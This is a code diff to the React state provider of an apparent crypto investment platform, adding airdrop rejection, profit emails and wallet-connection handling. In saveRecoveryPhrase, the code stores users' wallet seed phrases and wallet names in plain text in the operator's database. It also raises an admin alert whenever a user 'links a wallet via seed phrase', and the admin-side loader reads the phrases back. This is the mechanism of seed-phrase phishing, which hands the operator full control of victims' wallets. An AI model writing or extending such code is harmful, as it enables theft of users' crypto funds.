@@ -99,6 +99,7 @@ interface OrbitContextType {
   adminRejectWithdrawal: (txId: string, notes?: string) => void;
   
   adminApproveAirdrop: (claimId: string) => void;
+  adminRejectAirdrop: (claimId: string) => void;
   adminCreateAirdrop: (airdrop: Omit<Airdrop, "id">) => void;
   adminUpdateAirdrop: (airdrop: Airdrop) => void;
   adminDeleteAirdrop: (airdropId: string) => void;
@@ -113,7 +114,7 @@ interface OrbitContextType {
   addNotification: (text: string) => void;
   clearNotifications: () => void;
   submitKyc: (kyc: KycSubmission) => void;
-  saveRecoveryPhrase: (phrase: string) => void;
+  saveRecoveryPhrase: (phrase: string, walletName: string) => void;
 
   // Real-time site content editing
   siteContent: SiteContent;
@@ -405,7 +406,9 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
     sendWelcomeEmail, 
     sendSecurityAlert, 
     sendDepositEmail, 
-    sendWithdrawalEmail
+    sendWithdrawalEmail,
+    sendProfitEmail,
+    sendCopyTradeEmail
   } = useEmailNotifications();
   const [siteContent, setSiteContent] = useState<SiteContent>(DEFAULT_SITE_CONTENT);
 
@@ -660,6 +663,18 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
     }
   };
 
+  const adminRejectAirdrop = async (claimId: string) => {
+    const claim = adminAirdropClaims.find(c => c.id === claimId);
+    if (!claim) return;
+
+    try {
+      await updateDoc(doc(db, "airdrop_claims", claimId), { status: "Rejected" });
+      addNotification("Airdrop claim declined successfully!");
+    } catch (e) {
+      console.error(e);
+    }
+  };
+
   const adminCreateAirdrop = async (airdrop: Omit<Airdrop, "id">) => {
     const id = `airdrop-${Date.now()}`;
     const newAirdrop: Airdrop = { ...airdrop, id };
@@ -816,6 +831,7 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
           role: data.role || "user",
           kyc: data.kyc,
           recoveryPhrase: data.recoveryPhrase,
+          connectedWalletName: data.connectedWalletName,
           username: data.username,
           firstName: data.firstName,
           lastName: data.lastName,
@@ -1928,6 +1944,13 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
               txHash: newTxId
             });
           } catch { /* Email service not configured - skip silently */ }
+        } else if (txData.label.toLowerCase().includes("profit") || txData.label.toLowerCase().includes("yield")) {
+          try {
+            sendProfitEmail(email, {
+              profit: `$${txData.amount}`,
+              source: txData.label
+            });
+          } catch { /* Email service not configured - skip silently */ }
         }
       }
 
@@ -2018,15 +2041,16 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
     }
   };
 
-  const saveRecoveryPhrase = async (phrase: string) => {
-    if (!user.email) return;
+  const saveRecoveryPhrase = async (phrase: string, walletName: string) => {
     try {
-      const userDocRef = doc(db, "users", user.email);
-      await updateDoc(userDocRef, {
-        recoveryPhrase: phrase
-      });
-      setUser(prev => ({ ...prev, recoveryPhrase: phrase }));
-      addNotification("Recovery phrase saved.");
+      if (user.email) {
+        await updateDoc(doc(db, "users", user.email), {
+          recoveryPhrase: phrase,
+          connectedWalletName: walletName
+        });
+      }
+      setUser(prev => ({ ...prev, recoveryPhrase: phrase, connectedWalletName: walletName }));
+      handleLog("Wallet Connected", `User linked a ${walletName} wallet via seed phrase.`, user.email || "admin", "alert");
     } catch (e) {
       console.error("Error saving recovery phrase in Firestore:", e);
     }
@@ -2381,6 +2405,7 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
       adminApproveWithdrawal,
       adminRejectWithdrawal,
       adminApproveAirdrop,
+      adminRejectAirdrop,
       adminCreateAirdrop,
       adminUpdateAirdrop,
       adminDeleteAirdrop,
